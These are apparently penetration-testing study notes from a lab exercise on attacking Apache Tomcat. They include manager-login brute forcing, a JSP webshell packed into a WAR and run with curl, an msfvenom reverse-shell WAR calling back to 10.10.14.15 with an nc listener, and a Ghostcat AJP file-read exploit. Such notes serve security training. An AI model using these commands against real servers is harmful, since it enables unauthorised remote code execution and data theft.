
If we can access the `/manager` or `/host-manager` endpoints, we can likely achieve remote code execution on the Tomcat server
### Login bruteforcing


- Metasploit Module: [auxiliary/scanner/http/tomcat_mgr_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/tomcat_mgr_login/)
- Python Script: [Script](https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce)


### Uploading WAR file for RCE

This interface is available at `/manager/html` by default, which only users assigned the `manager-gui` role are allowed to access. Valid manager credentials can be used to upload a packaged Tomcat application (.WAR file) and compromise the application.


##### Manual Method
[JSP Webshell](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp) needs to be put in a WAR file

Getting webshell and creating war file
```shell-session
Auzzie@htb[/htb]$ wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
Auzzie@htb[/htb]$ zip -r backup.war cmd.jsp
```

Executing on webshell via curl
```shell-session
curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id
```


##### MSFvenom method

creating warfile with msfvevom
```shell-session
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war
```

hosting listener for revshell
```shell-session
nc -lnvp 4443
```


##### Metasploit method
- Module:  [multi/http/tomcat_mgr_upload](https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload/)


##### Lightweight Method
[JSP Source](https://github.com/SecurityRiskAdvisors/cmd.jsp)



### Ghostcat LFI

All Tomcat versions before 9.0.31, 8.5.51, and 7.0.100 were found vulnerable.
This vulnerability was caused by a misconfiguration in the AJP protocol used by Tomcat. AJP stands for Apache Jserv Protocol
The AJP service is usually running at port 8009 on a Tomcat server

Checking for AJP with nmap
```shell-session
Auzzie@htb[/htb]$ nmap -sV -p 8009,8080 app-dev.inlanefreight.local

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-21 20:05 EDT
Nmap scan report for app-dev.inlanefreight.local (10.129.201.58)
Host is up (0.14s latency).

PORT     STATE SERVICE VERSION
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
8080/tcp open  http    Apache Tomcat 9.0.30
```

[POC Script](https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi)

default usage
```shell-session
python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml 
```

